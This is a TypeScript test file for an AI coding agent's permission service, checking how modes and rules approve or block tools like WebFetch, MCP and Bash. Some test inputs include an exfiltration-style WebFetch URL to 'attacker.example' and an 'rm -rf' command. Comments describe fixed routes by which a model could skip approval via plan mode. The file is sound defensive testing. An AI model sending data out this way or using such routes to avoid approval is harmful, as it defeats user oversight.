import { describe, expect, it } from "vitest";
import { OFFICIAL_CUA_PERMISSION_RULE_TOOL_NAME } from "@zcode/shared";
import {
  PermissionService,
  type PermissionContext,
  type PermissionToolCapability,
} from "../src/permission/service.js";

const readCapability: PermissionToolCapability = {
  destructive: false,
  needsApproval: false,
  readOnly: true,
  riskLevel: "low",
  sideEffectScope: "none",
};

const writeCapability: PermissionToolCapability = {
  destructive: false,
  needsApproval: true,
  readOnly: false,
  riskLevel: "medium",
  sideEffectScope: "workspace",
};

const editCapability: PermissionToolCapability = {
  destructive: false,
  needsApproval: true,
  permission: {
    denyPriority: "beforeAsk",
    needsApproval: true,
    permission: "edit",
    reason: "Edit modifies file contents",
    riskLevel: "medium",
    sideEffectScope: "workspace",
  },
  readOnly: false,
  riskLevel: "medium",
  sideEffectScope: "workspace",
};

const webFetchCapability: PermissionToolCapability = {
  destructive: false,
  needsApproval: true,
  permission: {
    denyPriority: "beforeAsk",
    needsApproval: true,
    permission: "webfetch",
    reason: "Fetch a URL",
    riskLevel: "medium",
    sideEffectScope: "network",
  },
  readOnly: true,
  riskLevel: "medium",
  sideEffectScope: "network",
};

const sessionMutationCapability: PermissionToolCapability = {
  destructive: false,
  needsApproval: false,
  permission: {
    denyPriority: "beforeAsk",
    needsApproval: false,
    permission: "target.update",
    reason: "Update session-local goal state",
    riskLevel: "low",
    sideEffectScope: "session",
  },
  readOnly: false,
  riskLevel: "low",
  sideEffectScope: "session",
};

const automationSelfPauseCapability: PermissionToolCapability = {
  destructive: false,
  needsApproval: false,
  permission: {
    denyPriority: "beforeAsk",
    needsApproval: false,
    permission: "automation.pause",
    reason: "Pause only the automation that triggered this run",
    riskLevel: "low",
    sideEffectScope: "workspace",
  },
  readOnly: false,
  riskLevel: "low",
  sideEffectScope: "workspace",
};

const planModeSessionControlCapability: PermissionToolCapability = {
  allowedInPlanMode: true,
  destructive: false,
  needsApproval: false,
  permission: {
    denyPriority: "beforeAsk",
    needsApproval: false,
    permission: "agent.message.respond",
    reason: "Respond to the parent runtime queue",
    riskLevel: "low",
    sideEffectScope: "session",
  },
  readOnly: false,
  riskLevel: "low",
  sideEffectScope: "session",
};

const planModeTransitionCapability: PermissionToolCapability = {
  destructive: false,
  needsApproval: true,
  permission: {
    denyPriority: "beforeAsk",
    needsApproval: true,
    permission: "plan.exit",
    reason: "Exit plan mode after user approval",
    riskLevel: "low",
    sideEffectScope: "session",
  },
  readOnly: false,
  requiresUserInteraction: true,
  riskLevel: "low",
  sideEffectScope: "session",
};

const mcpCapability: PermissionToolCapability = {
  destructive: false,
  needsApproval: true,
  permission: {
    denyPriority: "beforeAsk",
    needsApproval: true,
    permission: "mcp",
    reason: "MCP tool executes through an external server",
    riskLevel: "medium",
    sideEffectScope: "network",
  },
  readOnly: false,
  riskLevel: "medium",
  sideEffectScope: "network",
};

const destructiveMcpCapability: PermissionToolCapability = {
  ...mcpCapability,
  destructive: true,
  permission: {
    ...mcpCapability.permission!,
    riskLevel: "high",
  },
  riskLevel: "high",
};

const fakeMcpNameCapability: PermissionToolCapability = {
  destructive: false,
  needsApproval: true,
  readOnly: false,
  riskLevel: "medium",
  sideEffectScope: "network",
};

describe("PermissionService mode policy", () => {
  it("treats WebSearch as read-only when resolving fallback capability", () => {
    const service = new PermissionService();

    const decision = service.checkPermission({
      input: { query: "latest zcode" },
      mode: "build",
      riskLevel: "low",
      toolName: "WebSearch",
    });

    expect(decision).toMatchObject({
      allowed: true,
      decision: "allow",
      riskLevel: "low",
      ruleId: "mode.build.readOnly",
      sideEffectScope: "none",
    });
  });

  it("allows read-only tools in plan mode", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: {},
        mode: "plan",
        riskLevel: "low",
        toolName: "Read",
      },
      readCapability,
    );

    expect(decision).toMatchObject({
      allowed: true,
      decision: "allow",
      ruleId: "mode.plan.readOnly",
    });
  });

  it("does not let allowedTools bypass plan mode write protection", () => {
    const service = new PermissionService({
      allowedTools: new Set(["Write"]),
      autoApproveHighRisk: false,
      disallowedTools: new Set(),
      allowMediumRiskInAutoMode: false,
    });

    const decision = service.checkPermission(
      {
        input: {},
        mode: "plan",
        riskLevel: "medium",
        toolName: "Write",
      },
      writeCapability,
    );

    expect(decision).toMatchObject({
      allowed: false,
      decision: "deny",
      ruleId: "mode.plan.nonReadOnly",
    });
  });

  it("denies non-read-only session mutations in plan mode", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { todos: [] },
        mode: "plan",
        riskLevel: "low",
        toolName: "TodoWrite",
      },
      sessionMutationCapability,
    );

    expect(decision).toMatchObject({
      allowed: false,
      decision: "deny",
      ruleId: "mode.plan.nonReadOnly",
    });
  });

  it("allows an explicit non-read-only session capability in plan mode", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { summary: "progress", message: "still working" },
        mode: "plan",
        riskLevel: "low",
        toolName: "RespondToCoordinator",
      },
      planModeSessionControlCapability,
    );

    expect(decision).toMatchObject({
      allowed: true,
      decision: "allow",
      ruleId: "mode.plan.explicitSessionCapability",
      sideEffectScope: "session",
    });
  });

  it("does not let explicit session capability bypass plan-mode deny or ask rules", () => {
    const context = {
      input: { summary: "progress", message: "still working" },
      mode: "plan" as const,
      riskLevel: "low" as const,
      toolName: "RespondToCoordinator",
    };
    const disallowed = new PermissionService({
      allowedTools: new Set(),
      autoApproveHighRisk: false,
      disallowedTools: new Set(["RespondToCoordinator"]),
      allowMediumRiskInAutoMode: false,
    });

    expect(disallowed.checkPermission(context, planModeSessionControlCapability)).toMatchObject({
      decision: "deny",
      ruleId: "rule.disallowedTools",
    });

    const service = new PermissionService();
    expect(
      service.checkPermission(context, planModeSessionControlCapability, {
        version: 1,
        deny: [{ toolName: "RespondToCoordinator" }],
      }),
    ).toMatchObject({ decision: "deny", ruleId: "rule.project.deny" });
    expect(
      service.checkPermission(context, planModeSessionControlCapability, {
        version: 1,
        ask: [{ toolName: "RespondToCoordinator" }],
      }),
    ).toMatchObject({ decision: "ask", ruleId: "rule.project.ask" });
  });

  it("rejects invalid explicit plan-mode capabilities", () => {
    const service = new PermissionService();
    const context = {
      input: {},
      mode: "plan" as const,
      riskLevel: "low" as const,
      toolName: "RespondToCoordinator",
    };

    for (const capability of [
      { ...planModeSessionControlCapability, destructive: true },
      {
        ...planModeSessionControlCapability,
        needsApproval: true,
        permission: {
          ...planModeSessionControlCapability.permission!,
          needsApproval: true,
        },
      },
      {
        ...planModeSessionControlCapability,
        permission: {
          ...planModeSessionControlCapability.permission!,
          sideEffectScope: "network" as const,
        },
        sideEffectScope: "network" as const,
      },
    ]) {
      expect(service.checkPermission(context, capability)).toMatchObject({
        decision: "deny",
        ruleId: "mode.plan.nonReadOnly",
      });
    }
  });

  // 修复原因：Plan 曾替换原模式并直接放行非 destructive MCP 与需审批的只读工具，
  // 比 build 更宽；EnterPlanMode 免确认，模型可借此免审批调用 MCP（含 node_repl js）与 WebFetch。
  it("asks once for non-read-only MCP tools in plan mode", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { query: "current simulator state" },
        mode: "plan",
        riskLevel: "medium",
        toolName: "mcp__ios_simulator__status",
      },
      mcpCapability,
    );

    expect(decision).toMatchObject({
      allowed: false,
      decision: "ask",
      optionsPolicy: "no-always-allow",
      ruleId: "mode.plan.mcp",
      sideEffectScope: "network",
    });
  });

  it("does not let project allow rules or allowedTools skip the plan-mode MCP ask", () => {
    const context = {
      input: { query: "current simulator state" },
      mode: "build" as const,
      planEnabled: true,
      riskLevel: "medium" as const,
      toolName: "mcp__ios_simulator__status",
    };
    expect(
      new PermissionService().checkPermission(context, mcpCapability, {
        version: 1,
        allow: [{ toolName: "mcp__ios_simulator__status" }],
      }),
    ).toMatchObject({ decision: "ask", ruleId: "mode.plan.mcp" });
    expect(
      new PermissionService({
        allowedTools: new Set(["mcp__ios_simulator__status"]),
        autoApproveHighRisk: false,
        disallowedTools: new Set(),
        allowMediumRiskInAutoMode: false,
      }).checkPermission(context, mcpCapability),
    ).toMatchObject({ decision: "ask", ruleId: "mode.plan.mcp" });
  });

  it("lets plan-mode read-only tools that need approval follow the original mode", () => {
    const service = new PermissionService();
    const readOnlyHintMcp = { ...mcpCapability, readOnly: true };
    const webFetch = {
      input: { url: "https://attacker.example/?data=secret" },
      riskLevel: "medium" as const,
      toolName: "WebFetch",
    };
    const mcpLookup = {
      input: { query: "x" },
      riskLevel: "medium" as const,
      toolName: "mcp__external__lookup",
    };

    for (const mode of ["build", "edit"] as const) {
      expect(
        service.checkPermission({ ...webFetch, mode, planEnabled: true }, webFetchCapability),
      ).toMatchObject({ decision: "ask" });
      expect(
        service.checkPermission({ ...mcpLookup, mode, planEnabled: true }, readOnlyHintMcp),
      ).toMatchObject({ decision: "ask" });
    }
    expect(
      service.checkPermission(
        {
          ...webFetch,
          input: { url: "https://docs.python.org/3/library/pathlib.html" },
          mode: "build",
          planEnabled: true,
        },
        webFetchCapability,
      ),
    ).toMatchObject({ decision: "allow", ruleId: "tool.webfetch.preapproved" });
    expect(
      service.checkPermission({ ...mcpLookup, mode: "build", planEnabled: true }, readOnlyHintMcp, {
        version: 1,
        allow: [{ toolName: "mcp__external__lookup" }],
      }),
    ).toMatchObject({ decision: "allow", ruleId: "rule.project.allow" });
  });

  it.each(["yolo", "guarded"] as const)(
    "keeps %s allowing MCP and approval-needing read-only tools in plan mode",
    (mode) => {
      const service = new PermissionService();
      for (const [toolName, capability] of [
        ["mcp__external__write", mcpCapability],
        ["mcp__external__lookup", { ...mcpCapability, readOnly: true }],
        ["WebFetch", webFetchCapability],
      ] as const) {
        expect(
          service.checkPermission(
            { input: {}, mode, planEnabled: true, riskLevel: "medium", toolName },
            capability,
          ),
        ).toMatchObject({ decision: "allow" });
      }
      expect(
        service.checkPermission(
          { input: {}, mode, planEnabled: true, riskLevel: "high", toolName: "mcp__device__reset" },
          destructiveMcpCapability,
        ),
      ).toMatchObject({ decision: "deny", ruleId: "mode.plan.nonReadOnly" });
    },
  );

  // 修复原因：guarded 的单次确认分支带 !planEnabled，开着 Plan 时被整个跳过，闸门之后又补回
  // guarded 放行；危险命令规则一旦匹配到能通过闸门的工具，guarded + Plan 就会免确认执行。
  it("keeps the guarded single-use approval after the plan gate", () => {
    const service = new PermissionService();
    for (const [toolName, capability] of [
      ["Read", { ...readCapability, userApprovalRule: "safety.test.rule" }],
      ["mcp__external__write", { ...mcpCapability, userApprovalRule: "safety.test.rule" }],
    ] as const) {
      expect(
        service.checkPermission(
          { input: {}, mode: "guarded", planEnabled: true, riskLevel: "high", toolName },
          capability,
        ),
      ).toMatchObject({ decision: "ask", approvalMode: "user-once", ruleId: "safety.test.rule" });
    }
    expect(
      service.checkPermission(
        { input: {}, mode: "guarded", planEnabled: true, riskLevel: "high", toolName: "Write" },
        { ...writeCapability, userApprovalRule: "safety.test.rule" },
      ),
    ).toMatchObject({ decision: "deny", ruleId: "mode.plan.nonReadOnly" });
  });

  it("never makes plan mode more permissive than the original mode", () => {
    const rank = { deny: 0, ask: 1, allow: 2 } as const;
    const capabilities: Array<[string, PermissionToolCapability]> = [
      ["Read", readCapability],
      ["Write", writeCapability],
      ["Edit", editCapability],
      ["WebFetch", webFetchCapability],
      ["TodoWrite", sessionMutationCapability],
      ["CronPauseSelf", automationSelfPauseCapability],
      ["RespondToCoordinator", planModeSessionControlCapability],
      ["mcp__external__write", mcpCapability],
      ["mcp__external__lookup", { ...mcpCapability, readOnly: true }],
      ["mcp__device__reset", destructiveMcpCapability],
      ["mcp__fake__write", fakeMcpNameCapability],
      // 目前只有危险 Bash 带 userApprovalRule；这两项防止以后只读工具或 MCP 带上它时 Plan 跳过单次确认。
      ["ReadWithApprovalRule", { ...readCapability, userApprovalRule: "safety.test.rule" }],
      ["mcp__external__guarded", { ...mcpCapability, userApprovalRule: "safety.test.rule" }],
    ];
    for (const mode of ["build", "edit", "yolo", "guarded"] as const) {
      for (const [toolName, capability] of capabilities) {
        const context = {
          input: { url: "https://attacker.example/" },
          mode,
          riskLevel: capability.riskLevel ?? ("medium" as const),
          toolName,
        };
        const original = new PermissionService().checkPermission(
          { ...context, planEnabled: false },
          capability,
        );
        const planned = new PermissionService().checkPermission(
          { ...context, planEnabled: true },
          capability,
        );
        expect(
          rank[planned.decision] <= rank[original.decision],
          `${mode} ${toolName}: plan=${planned.decision}(${planned.ruleId}) original=${original.decision}(${original.ruleId})`,
        ).toBe(true);
      }
    }
  });

  it("denies destructive MCP tools in plan mode", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { target: "device" },
        mode: "plan",
        riskLevel: "high",
        toolName: "mcp__device__reset",
      },
      destructiveMcpCapability,
    );

    expect(decision).toMatchObject({
      allowed: false,
      decision: "deny",
      ruleId: "mode.plan.nonReadOnly",
    });
  });

  it("does not treat an mcp-prefixed tool name as MCP without the mcp permission declaration", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: {},
        mode: "plan",
        riskLevel: "medium",
        toolName: "mcp__fake__write",
      },
      fakeMcpNameCapability,
    );

    expect(decision).toMatchObject({
      allowed: false,
      decision: "deny",
      ruleId: "mode.plan.nonReadOnly",
    });
  });

  it("lets project deny rules override the plan-mode MCP ask", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { query: "secret" },
        mode: "plan",
        riskLevel: "medium",
        toolName: "mcp__external__search",
      },
      mcpCapability,
      {
        version: 1,
        deny: [{ toolName: "mcp__external__search" }],
      },
    );

    expect(decision).toMatchObject({
      allowed: false,
      decision: "deny",
      ruleId: "rule.project.deny",
    });
  });

  it("lets project ask rules override the plan-mode MCP ask", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { query: "maybe external" },
        mode: "plan",
        riskLevel: "medium",
        toolName: "mcp__external__search",
      },
      mcpCapability,
      {
        version: 1,
        ask: [{ toolName: "mcp__external__search" }],
      },
    );

    expect(decision).toMatchObject({
      allowed: false,
      decision: "ask",
      ruleId: "rule.project.ask",
    });
  });

  it("denies ExitPlanMode outside plan mode before asking for approval", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { plan: "Implement the approved steps." },
        mode: "build",
        riskLevel: "low",
        toolName: "ExitPlanMode",
      },
      planModeTransitionCapability,
    );

    expect(decision).toMatchObject({
      allowed: false,
      decision: "deny",
      ruleId: "mode.plan.exitOnly",
    });
  });

  it("asks for ExitPlanMode approval while plan mode is active", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { plan: "Implement the approved steps." },
        mode: "plan",
        riskLevel: "low",
        toolName: "ExitPlanMode",
      },
      planModeTransitionCapability,
    );

    expect(decision).toMatchObject({
      allowed: false,
      decision: "ask",
      ruleId: "tool.userInteraction",
    });
  });

  it("asks for ExitPlanMode approval even when plan mode was entered from yolo", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { plan: "Implement the approved steps." },
        mode: "plan",
        prePlanMode: "yolo",
        riskLevel: "low",
        toolName: "ExitPlanMode",
      },
      planModeTransitionCapability,
    );

    expect(decision).toMatchObject({
      allowed: false,
      decision: "ask",
      ruleId: "tool.userInteraction",
    });
  });

  it("allows EnterPlanMode without approval", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: {},
        mode: "build",
        riskLevel: "low",
        toolName: "EnterPlanMode",
      },
      {
        ...planModeTransitionCapability,
        permission: {
          ...planModeTransitionCapability.permission!,
          permission: "plan.enter",
          reason: "Enter plan mode from yolo",
        },
      },
    );

    expect(decision).toMatchObject({
      allowed: true,
      decision: "allow",
      ruleId: "tool.plan.enter",
    });
  });

  it("asks for side-effecting tools in build mode", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: {},
        mode: "build",
        riskLevel: "medium",
        toolName: "Write",
      },
      writeCapability,
    );

    expect(decision).toMatchObject({
      allowed: false,
      decision: "ask",
      escalated: true,
      ruleId: "mode.build.sideEffect",
    });
  });

  it("allows file edit tools in edit mode", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { file_path: "demo.txt" },
        mode: "edit",
        riskLevel: "medium",
        toolName: "Edit",
      },
      editCapability,
    );

    expect(decision).toMatchObject({
      allowed: true,
      decision: "allow",
      escalated: false,
      ruleId: "mode.edit.fileEdit",
    });
  });

  it("keeps non-edit side effects on build-mode approval behavior in edit mode", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { command: "npm run build" },
        mode: "edit",
        riskLevel: "high",
        toolName: "Bash",
      },
      {
        destructive: true,
        needsApproval: true,
        readOnly: false,
        riskLevel: "high",
        sideEffectScope: "workspace",
      },
    );

    expect(decision).toMatchObject({
      allowed: false,
      decision: "ask",
      escalated: true,
      ruleId: "mode.build.highRisk",
    });
  });

  it("lets project ask rules override edit mode auto-approval", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { file_path: "demo.txt" },
        mode: "edit",
        riskLevel: "medium",
        toolName: "Edit",
      },
      editCapability,
      {
        version: 1,
        ask: [{ toolName: "Edit" }],
      },
    );

    expect(decision).toMatchObject({
      allowed: false,
      decision: "ask",
      ruleId: "rule.project.ask",
    });
  });

  it("lets project allow rules stay explicit in edit mode", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { file_path: "demo.txt" },
        mode: "edit",
        riskLevel: "medium",
        toolName: "Write",
      },
      writeCapability,
      {
        version: 1,
        allow: [{ toolName: "Write" }],
      },
    );

    expect(decision).toMatchObject({
      allowed: true,
      decision: "allow",
      ruleId: "rule.project.allow",
    });
  });

  it("allows low-risk session-local state updates in build mode without approval", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { todos: [] },
        mode: "build",
        riskLevel: "low",
        toolName: "TodoWrite",
      },
      sessionMutationCapability,
    );

    expect(decision).toMatchObject({
      allowed: true,
      decision: "allow",
      ruleId: "mode.build.sessionState",
    });
  });

  it("allows CronPauseSelf in build mode without approval", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: {},
        mode: "build",
        riskLevel: "low",
        toolName: "CronPauseSelf",
      },
      automationSelfPauseCapability,
    );

    expect(decision).toMatchObject({
      allowed: true,
      decision: "allow",
      ruleId: "tool.automationPauseSelf.preapproved",
    });
  });

  it("lets project ask rules override CronPauseSelf auto-approval", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: {},
        mode: "build",
        riskLevel: "low",
        toolName: "CronPauseSelf",
      },
      automationSelfPauseCapability,
      {
        version: 1,
        ask: [{ toolName: "CronPauseSelf" }],
      },
    );

    expect(decision).toMatchObject({
      allowed: false,
      decision: "ask",
      ruleId: "rule.project.ask",
    });
  });

  it("allows explicitly allowed tools in build mode", () => {
    const service = new PermissionService({
      allowedTools: new Set(["Write"]),
      autoApproveHighRisk: false,
      disallowedTools: new Set(),
      allowMediumRiskInAutoMode: false,
    });

    const decision = service.checkPermission(
      {
        input: {},
        mode: "build",
        riskLevel: "medium",
        toolName: "Write",
      },
      writeCapability,
    );

    expect(decision).toMatchObject({
      allowed: true,
      decision: "allow",
      ruleId: "rule.allowedTools",
    });
  });

  it("allows side-effecting tools that match project permission rules", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { file_path: "demo.txt" },
        mode: "build",
        riskLevel: "medium",
        toolName: "Write",
      },
      writeCapability,
      {
        version: 1,
        allow: [{ toolName: "Write" }],
      },
    );

    expect(decision).toMatchObject({
      allowed: true,
      decision: "allow",
      ruleId: "rule.project.allow",
    });
  });

  it("shares an official CUA project rule only with authority-verified CUA tools", () => {
    const service = new PermissionService();
    const rules = {
      allow: [{ toolName: OFFICIAL_CUA_PERMISSION_RULE_TOOL_NAME }],
      version: 1 as const,
    };
    const context = {
      input: { app_ref: { bundle_id: "com.apple.TextEdit" } },
      mode: "build" as const,
      riskLevel: "medium" as const,
      toolName: "mcp__computer-use__left_click",
    };

    const trusted = service.checkPermission(
      context,
      {
        ...mcpCapability,
        permissionCapabilityGroup: "official_cua",
      } as PermissionToolCapability,
      rules as never,
    );
    const sameNameButUntrusted = service.checkPermission(context, mcpCapability, rules as never);

    expect(trusted).toMatchObject({
      allowed: true,
      decision: "allow",
      ruleId: "rule.project.allow",
    });
    expect(sameNameButUntrusted).toMatchObject({
      allowed: false,
      decision: "ask",
      ruleId: "mode.build.sideEffect",
    });
  });

  it("does not let project allow rules bypass plan mode write protection", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { file_path: "demo.txt" },
        mode: "plan",
        riskLevel: "medium",
        toolName: "Write",
      },
      writeCapability,
      {
        version: 1,
        allow: [{ toolName: "Write" }],
      },
    );

    expect(decision).toMatchObject({
      allowed: false,
      decision: "deny",
      ruleId: "mode.plan.nonReadOnly",
    });
  });

  it("matches project command prefix rules", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { command: "npm run test -- --watch=false" },
        mode: "build",
        riskLevel: "high",
        toolName: "Bash",
      },
      {
        destructive: true,
        needsApproval: true,
        readOnly: false,
        riskLevel: "high",
        sideEffectScope: "workspace",
      },
      {
        version: 1,
        allow: [{ toolName: "Bash", ruleContent: "npm run:*" }],
      },
    );

    expect(decision).toMatchObject({
      allowed: true,
      decision: "allow",
      ruleId: "rule.project.allow",
    });
  });

  it("matches WebFetch project rules by normalized domain", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { url: "  https://EXAMPLE.com/docs?token=redacted  " },
        mode: "build",
        riskLevel: "medium",
        toolName: "WebFetch",
      },
      webFetchCapability,
      {
        version: 1,
        allow: [{ toolName: "WebFetch", ruleContent: "domain:example.com" }],
      },
    );

    expect(decision).toMatchObject({
      allowed: true,
      decision: "allow",
      ruleId: "rule.project.allow",
    });
  });

  it("does not match WebFetch project rules against full URLs", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { url: "http://example.com/docs" },
        mode: "build",
        riskLevel: "medium",
        toolName: "WebFetch",
      },
      webFetchCapability,
      {
        version: 1,
        deny: [{ toolName: "WebFetch", ruleContent: "https://example.com/docs" }],
      },
    );

    expect(decision).toMatchObject({
      allowed: false,
      decision: "ask",
      ruleId: "mode.build.sideEffect",
    });
  });

  it("allows preapproved WebFetch URLs after project deny and ask rules are checked", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { url: "https://docs.python.org/3/library/pathlib.html" },
        mode: "build",
        riskLevel: "medium",
        toolName: "WebFetch",
      },
      webFetchCapability,
      {
        version: 1,
      },
    );

    expect(decision).toMatchObject({
      allowed: true,
      decision: "allow",
      ruleId: "tool.webfetch.preapproved",
    });
  });

  it("does not auto-allow removed vendor WebFetch URLs", () => {
    const service = new PermissionService();

    for (const url of [
      "https://platform.claude.com/docs",
      "https://code.claude.com/docs",
      "https://github.com/anthropics/example",
    ]) {
      const decision = service.checkPermission(
        {
          input: { url },
          mode: "build",
          riskLevel: "medium",
          toolName: "WebFetch",
        },
        webFetchCapability,
        {
          version: 1,
        },
      );

      expect(decision, url).toMatchObject({
        allowed: false,
        decision: "ask",
        ruleId: "mode.build.sideEffect",
      });
    }
  });

  it("lets WebFetch project ask rules override preapproved URL auto-allow", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { url: "https://docs.python.org/3/library/pathlib.html" },
        mode: "build",
        riskLevel: "medium",
        toolName: "WebFetch",
      },
      webFetchCapability,
      {
        version: 1,
        ask: [{ toolName: "WebFetch", ruleContent: "domain:docs.python.org" }],
      },
    );

    expect(decision).toMatchObject({
      allowed: false,
      decision: "ask",
      ruleId: "rule.project.ask",
    });
  });

  it("lets WebFetch project deny domain rules override allow rules", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { url: "https://example.com/docs" },
        mode: "build",
        riskLevel: "medium",
        toolName: "WebFetch",
      },
      webFetchCapability,
      {
        version: 1,
        allow: [{ toolName: "WebFetch", ruleContent: "domain:*.example.com" }],
        deny: [{ toolName: "WebFetch", ruleContent: "domain:example.com" }],
      },
    );

    expect(decision).toMatchObject({
      allowed: false,
      decision: "deny",
      ruleId: "rule.project.deny",
    });
  });

  it("lets yolo bypass disallowed tool rules", () => {
    const service = new PermissionService({
      allowedTools: new Set(),
      autoApproveHighRisk: false,
      disallowedTools: new Set(["Bash"]),
      allowMediumRiskInAutoMode: false,
    });

    const decision = service.checkPermission(
      {
        input: { command: "rm -rf build" },
        mode: "yolo",
        riskLevel: "high",
        toolName: "Bash",
      },
      {
        destructive: true,
        needsApproval: true,
        readOnly: false,
        riskLevel: "high",
        sideEffectScope: "system",
      },
    );

    expect(decision).toMatchObject({
      allowed: true,
      decision: "allow",
      ruleId: "mode.yolo",
    });
  });

  it("does not let yolo bypass user interaction tools", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: {
          questions: [
            {
              header: "Choice",
              question: "Which option should we use?",
              options: [
                { label: "A", description: "Use A" },
                { label: "B", description: "Use B" },
              ],
            },
          ],
        },
        mode: "yolo",
        riskLevel: "low",
        toolName: "AskUserQuestion",
      },
      {
        destructive: false,
        needsApproval: true,
        readOnly: true,
        requiresUserInteraction: true,
        riskLevel: "low",
        sideEffectScope: "userInteraction",
      },
    );

    expect(decision).toMatchObject({
      allowed: false,
      decision: "ask",
      ruleId: "tool.userInteraction",
    });
  });

  it("keeps auto mode reserved and non-executable", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: {},
        mode: "auto",
        riskLevel: "low",
        toolName: "Read",
      },
      readCapability,
    );

    expect(decision).toMatchObject({
      allowed: false,
      decision: "deny",
      ruleId: "mode.auto.unimplemented",
    });
  });
});

// ── alwaysAsk：模式无关的确认（docs/dynamic-workflow/launch.md「Why the window always appears」）──

const alwaysAskCapability: PermissionToolCapability = {
  destructive: false,
  needsApproval: true,
  permission: {
    alwaysAsk: true,
    denyPriority: "beforeAsk",
    needsApproval: true,
    permission: "createWorkflow",
    reason: "createWorkflow.runConfirmation",
    riskLevel: "low",
    sideEffectScope: "none",
  },
  readOnly: true,
  riskLevel: "low",
  sideEffectScope: "none",
};

describe("PermissionService alwaysAsk", () => {
  function check(mode: PermissionContext["mode"], service = new PermissionService()) {
    return service.checkPermission(
      { input: { script: "return 1;" }, mode, riskLevel: "low", toolName: "CreateWorkflow" },
      alwaysAskCapability,
    );
  }

  // 宽松度设置一律压不过 alwaysAsk：yolo 直通、plan 的 readOnly 直通、edit/build 都要问。
  for (const mode of ["yolo", "plan", "build", "edit", "default"] as const) {
    it(`asks in ${mode} mode`, () => {
      expect(check(mode)).toMatchObject({
        allowed: false,
        alwaysAsk: true,
        decision: "ask",
        ruleId: "tool.alwaysAsk",
      });
    });
  }

  // 反向边界：alwaysAsk 只压过"放行"分支，压不过"阻断"分支。
  it("still yields to an explicitly disallowed tool", () => {
    const service = new PermissionService({
      allowedTools: new Set(),
      allowMediumRiskInAutoMode: false,
      autoApproveHighRisk: false,
      disallowedTools: new Set(["CreateWorkflow"]),
    });

    expect(check("yolo", service)).toMatchObject({
      allowed: false,
      decision: "deny",
      ruleId: "rule.disallowedTools",
    });
  });

  it("still yields to a project deny rule", () => {
    const service = new PermissionService();

    const decision = service.checkPermission(
      {
        input: { script: "return 1;" },
        mode: "yolo",
        riskLevel: "low",
        toolName: "CreateWorkflow",
      },
      alwaysAskCapability,
      { deny: [{ toolName: "CreateWorkflow" }], version: 1 },
    );

    expect(decision).toMatchObject({
      allowed: false,
      decision: "deny",
      ruleId: "rule.project.deny",
    });
  });

  it("still yields to auto mode being unimplemented", () => {
    expect(check("auto")).toMatchObject({
      allowed: false,
      decision: "deny",
      ruleId: "mode.auto.unimplemented",
    });
  });

  it("leaves tools without the flag on their existing mode semantics", () => {
    expect(
      new PermissionService().checkPermission(
        { input: {}, mode: "yolo", riskLevel: "low", toolName: "Read" },
        readCapability,
      ),
    ).toMatchObject({ allowed: true, decision: "allow", ruleId: "mode.yolo" });
  });
});

// ── 会话免确认（docs/dynamic-workflow/launch.md「Always allow in this session」）──
// 「Always allow in this session」把 alwaysAsk gate 在一个 PermissionService 实例（= 一个会话）内
// 关掉；阻断分支仍然优先，普通工具的模式语义不认会话规则。

describe("PermissionService session grant", () => {
  const sessionGrant = [
    {
      behavior: "allow" as const,
      rules: [{ toolName: "CreateWorkflow" }],
      type: "addRules" as const,
    },
  ];

  function check(
    mode: PermissionContext["mode"],
    service: PermissionService,
    toolName = "CreateWorkflow",
  ) {
    return service.checkPermission(
      { input: { script: "return 2;" }, mode, riskLevel: "low", toolName },
      alwaysAskCapability,
    );
  }

  for (const mode of ["yolo", "plan", "build", "edit", "default"] as const) {
    it(`lifts the alwaysAsk gate in ${mode} mode once the session grant is in place`, () => {
      const service = new PermissionService();
      expect(check(mode, service).decision).toBe("ask");

      service.grantSessionPermission(sessionGrant);

      expect(check(mode, service)).toMatchObject({
        allowed: true,
        decision: "allow",
        ruleId: "rule.session.allow",
      });
    });
  }

  it("is scoped to the granted tool name", () => {
    const service = new PermissionService();
    service.grantSessionPermission(sessionGrant);

    expect(check("build", service, "SaveWorkflow")).toMatchObject({
      decision: "ask",
      ruleId: "tool.alwaysAsk",
    });
  });

  it("does not survive into a fresh service instance (session boundary)", () => {
    const granted = new PermissionService();
    granted.grantSessionPermission(sessionGrant);
    expect(check("build", granted).decision).toBe("allow");

    expect(check("build", new PermissionService()).decision).toBe("ask");
  });

  it("still yields to an explicitly disallowed tool", () => {
    const service = new PermissionService({
      allowedTools: new Set(),
      allowMediumRiskInAutoMode: false,
      autoApproveHighRisk: false,
      disallowedTools: new Set(["CreateWorkflow"]),
    });
    service.grantSessionPermission(sessionGrant);

    expect(check("yolo", service)).toMatchObject({
      decision: "deny",
